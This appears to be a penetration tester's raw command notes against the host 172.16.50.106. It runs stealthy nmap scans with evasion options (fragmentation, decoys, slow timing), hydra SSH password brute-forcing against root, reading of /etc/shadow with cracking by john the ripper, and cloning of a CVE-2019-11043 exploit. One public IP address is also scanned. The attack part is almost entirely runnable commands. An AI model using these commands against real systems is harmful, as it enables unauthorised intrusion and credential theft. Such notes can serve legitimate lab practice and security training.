#### Target file, contain the list of items
```
cat target.txt
172.16.50.106
```
telnet 172.16.50.106 22

nmap -sC -sV 172.16.50.106 -Pn -n\
whereis nmap\
locate nmap

#### Starting metasploit
msfconsole

#### Install security audit tool
apt-get install lynis\
lynis\
lynis show\
lynis show tests\
ls\
lynis show\
lynis show commands\
lynis audit

#### Run test
lynis audit system

#### Run test on remote system
lynis audit system remote 172.16.50.106

#### Lynis default configuration
cat /etc/lynis/default.prf

#### Run nmap
nmap -sS -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 22 --script "default or (discovery and safe)"\
nmap -sS -T4 -A -v -PN -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 22\

#### CLI tool for reading, writing, redirecting data across a network.
apt install netcat\
apt install ncat\
nc -v 172.16.50.106 80\
nc -v 172.16.50.106 21\
nc -v 172.16.50.106 1514\
nc -v 172.16.50.106:1514\
nc -v 172.16.50.106 1514\
nmap -Pn -n -O 172.16.50.106

ssh root@172.16.50.106\
msfconsole -q\
apt install metasploit-framework -y\
msfconsole\
msfdb\
msfdb init\
msfconsole -q

#### Install penetration Testing tool
apt install seclists -y 

nmap -iL target.txt -p22 -sC -sV -Pn -n\
nmap -sC -sV -Pn -n 172.16.50.106\
nmap -sC -sV -Pn -n 172.16.50.106 -p-\
nmap -sC -sV -Pn -n 172.16.50.106 -sT\
nmap -sC -sV -Pn -n 172.16.50.106 -sT -p-\
nmap -sC -sV -Pn -n 172.16.50.106 -sM -p-\
cat target.txt\
nmap -sC 172.16.50.106 -sU -Pn -n\
ping 8.8.8.8

nmap -sC -sV 172.16.50.106 -Pn -n\
nmap -sC -sV 172.16.50.106 -Pn -n -p-\
lsb_release -a\
nmap -sC -sV 172.16.50.106 -Pn -n -p- -sU\
apt install tmux

tmux\
mkdir syn_scan\
nmap -sS -Pn -n -p- -iL target.txt -oA syn_scan/syn_all_port &

mkdir fin_scan\
nmap -sF -Pn -n -p- -iL target.txt -oA fin_scan/fin_all_port &

cd nmap_ab/syn_scan/\
cat syn_all_port.nmap 

cd fin_scan/

cat fin_all_port.nmap\ 
wc -l *\
cat fin_all_port.xml

rm -rf fin_scan/\
mkdir xmas\
nmap -sX  -Pn -n -p- -iL target.txt -oA xmas/xmas_all_port\
nmap -sX  -Pn -n -p- -iL target.txt -oA xmas/xmas_all_port *\
nmap -sX  -Pn -n -p- -iL target.txt -oA xmas/xmas_all_port &

cat xmas/xmas_all_port.nmap\
nmap -sC -sV -p22 -Pn -n 172.16.50.106

cd /opt/\
mv SecLists-master seclist-master\
cd seclist-master/Passwords/Common-Credentials/\
cat top-passwords-shortlist.txt\
cd ..\
cd Leaked-Databases/\
ls\
cat hak5.txt\

cd ../../Usernames/ \
ls\
less CommonAdminBase64.txt\
less top-usernames-shortlist.txt\
cd Names/\
cat names.txt\
cd /opt/\
git clone git://github.com/kevinburke/sshpass.git\
cd seclist-master/Passwords/\
cat der-postillon.txt\
cd Default-Credentials/\
cat default-passwords.csv \
cp ssh-betterdefaultpasslist.txt ssh-betterdefaultpasslist_bkp.txt\
nano ssh-betterdefaultpasslist.txt \
cat /home/target.txt \
telnet 172.16.50.106 22\
nano ssh-username.txt\
cd ../Common-Credentials/ \
cat 10-million-password-list-top-100.txt 

cd ../Default-Credentials/ \
cat ssh-username.txt

#### Install penetration testing tool
apt-get install hydra\
hydra\
hydra -L ls\
hydra -L /opt/seclist-master/Passwords/Default-Credentials/ssh-username.txt -p /opt/seclist-master/Passwords/Common-Credentials/10-million-password-list-top-100.txt ssh://172.16.50.106 -V -t 8\
hydra -L /opt/seclist-master/Passwords/Default-Credentials/ssh-username.txt -p /opt/seclist-master/Passwords/Common-Credentials/10-million-password-list-top-100.txt ssh://172.16.50.106 -V -t 4\
hydra -l root -p /opt/seclist-master/Passwords/Common-Credentials/10-million-password-list-top-100.txt ssh://172.16.50.106 -V -t 4\
hydra -l root -p /opt/seclist-master/Passwords/Common-Credentials/10-million-password-list-top-100.txt 172.16.50.106 -V -t 8 ssh\
hydra -l root -p /opt/seclist-master/Passwords/Common-Credentials/10-million-password-list-top-100.txt 172.16.50.106 -t 32 ssh\
hydra -l root -P /opt/seclist-master/Passwords/Common-Credentials/10-million-password-list-top-100.txt 172.16.50.106 -t 32 ssh\
hydra -l root -P /opt/seclist-master/Passwords/Common-Credentials/10-million-password-list-top-100.txt 172.16.50.106 -t 32 ssh

apt-get remove hydra\
git clone https://github.com/vanhauser-thc/thc-hydra.git\
cd thc-hydra\
./configure\
make install\
apt-get install libssl-dev libssh-dev libidn11-dev libpcre3-dev \
                  libgtk2.0-dev libmysqlclient-dev libpq-dev libsvn-dev \
                  firebird-dev libmemcached-dev libgpg-error-dev \
                  libgcrypt11-dev libgcrypt20-dev
hydra\
apt-get remove hydra\
apt-get install hydra-gtk\
cat hydra-wizard.sh\
hydra -l root -P /opt/seclist-master/Passwords/Common-Credentials/10-million-password-list-top-1000.txt -u 172.16.50.106 ssh\
mkdir /opt/cred && cd /opt/cred\
cp /opt/seclist-master/Passwords/Default-Credentials/ssh-username.txt /opt/cred/\
cp /opt/seclist-master/Passwords/Common-Credentials/*.* /opt/cred/\
nano best.txt

ssh root@172.16.50.106\
nmap -p22 -Pn -sC -sS 172.16.50.106\
cd /home\
nmap -p22 -Pn -sC -sS -iL /home/target.txt \
nmap -p- -Pn -sC -sS -iL /home/target.txt 

#### Advanced vulnerability scan
git clone https://github.com/scipag/vulscan scipag_vulscan \
cd scipag_vulscan/ \
ln -s `pwd`/scipag_vulscan /usr/share/nmap/scripts/vulscan   \
nmap -sV --script=vulscan/vulscan.nse -sS -PN -iL /home/target.txt  \
nmap -sV --script=vulscan/vulscan.nse -iL /home/target.txt  \
nmap -sV --script=vulscan/vulscan.nse 172.16.50.106 \
cd /usr/share/nmap/scripts/ \
git clone https://github.com/scipag/vulscan scipag_vulscan \
ln -s `pwd`/scipag_vulscan /usr/share/nmap/scripts/vulscan \
ln -s `pwd`/scipag_vulscan /usr/share/nmap/scripts/vulscan1 \
nmap -sV --script=vulscan1/vulscan.nse 172.16.50.106 \
nmap -sV -PN --script=vulscan1/vulscan.nse 172.16.50.106 \
nmap -sV -PN --script=vulscan1/vulscan.nse -iL /home/target.txt  \
nmap -sS -sC -sV -PN --script=vulscan1/vulscan.nse -iL /home/target.txt  \
nmap -f -sS -sC -sV -PN --script=vulscan1/vulscan.nse -iL /home/target.txt \ 
nmap -f -sS -sC -sV -PN 172.16.50.106 -g 22 \
nmap -f -p22 -sS -sC -sV -PN 172.16.50.106 -g 22 \
telnet 172.16.50.106 22 \
nmap -f -t 0 -n -Pn –data-length 200 -D /home/target.txt  \
nmap -f -t 0 -n -Pn –data-length 200 -D -iL /home/target.txt \
nmap -f -t0 -n -Pn –data-length 200 -D -iL /home/target.txt \
nmap -f -T0 -n -Pn –data-length 200 -D -iL /home/target.txt \
nmap -f -T0 -n -Pn –data-length 200 -iL /home/target.txt \
nmap -vv -f -T0 -n -Pn –data-length 200 -iL /home/target.txt \
ls \
msfconsole -q \
cd /opt/seclist-master/Passwords/Common-Credentials/ \
cd ../../../../ \
msfconsole \
cd /opt/cred/ \
nano common-passwords-win.txt \

cat ssh-username.txt 
```
cat google.txt
root
admin
```
msfconsole \
cat /etc/passwd \
cat /etc/shadow

#### Crack the password using john the ripper
apt install john \
unshadow /etc/passwd /etc/shadow > /home/pass.txt

#### Crack the password
cd /home/ \
cat pass.txt  \
john pass.txt  \
john --show pass.txt \
john --wordlist=/usr/share/john/password.lst --rules pass.txt  \
telnet 172.16.50.106 80 \
telnet 172.16.50.106 443 

nmap -PN 172.16.50.106 \
ping -a 172.16.50.106 \
ping 172.16.50.106 \
ping -sS -PN 172.16.50.106 \
nmap -sS -PN 172.16.50.106 \
nmap -sS -PN -A -sV 172.16.50.106 \
nmap -sS -PN -sC -sV 172.16.50.106 \
nmap -sS -PN -sC -sV 13.126.3.114 \
nmap -sS -PN -vv -f 172.16.50.106 

#### Install penetration test tool
apt-get install hping3 \
hping3 \
cat target.txt \
hping3 -A 172.16.50.106 \
hping3 -T 172.16.50.106 \
hping3 -F 172.16.50.106 \
hping3 -U 172.16.50.106 \
hping3 -P 172.16.50.106 \
hping3 -S 1-1000 172.16.50.106 \
hping3 -s 1-1000 172.16.50.106


cd /opt/ \
git clone https://github.com/theMiddleBlue/CVE-2019-11043.git \
ls \
cd CVE-2019-11043/

#### Install docker compose 
apt-get install docker-compose \
curl -L https://github.com/docker/compose/releases/download/1.21.2/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose \
chmod +x /usr/local/bin/docker-compose \
docker-compose --version \
docker-compose up -d \
apt install docker.io
